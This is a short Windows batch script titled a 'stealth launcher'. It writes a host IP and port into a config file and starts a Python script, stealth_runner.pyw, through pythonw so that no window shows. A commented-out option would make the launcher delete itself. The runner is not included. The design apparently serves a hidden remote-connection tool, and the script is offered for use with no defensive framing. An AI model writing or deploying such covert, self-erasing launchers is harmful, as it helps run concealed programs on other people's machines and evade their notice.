@echo off
REM Stealth launcher - runs without visible window
REM Edit the IP and port below

set HOST_IP=192.168.1.100
set PORT=5555

REM Create config file
echo %HOST_IP% > stealth_config.txt
echo %PORT% >> stealth_config.txt

REM Run hidden using pythonw (no console)
start /B pythonw stealth_runner.pyw

REM Self-delete this batch file (optional)
REM (start /b cmd /c del "%~f0"&exit /b)

exit
